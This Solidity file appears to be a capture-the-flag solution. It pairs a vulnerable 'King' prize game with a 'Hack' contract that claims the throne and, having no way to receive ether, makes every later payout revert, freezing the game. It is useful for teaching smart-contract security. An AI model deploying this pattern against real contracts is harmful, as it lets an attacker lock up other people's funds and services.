pragma solidity ^0.8.0;

contract Hack {
    constructor(address payable target) payable {
        uint prize = King(target).prize();
        (bool ok, ) = target.call{value: prize}("");
        require(ok, "call failed");
    }
}

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}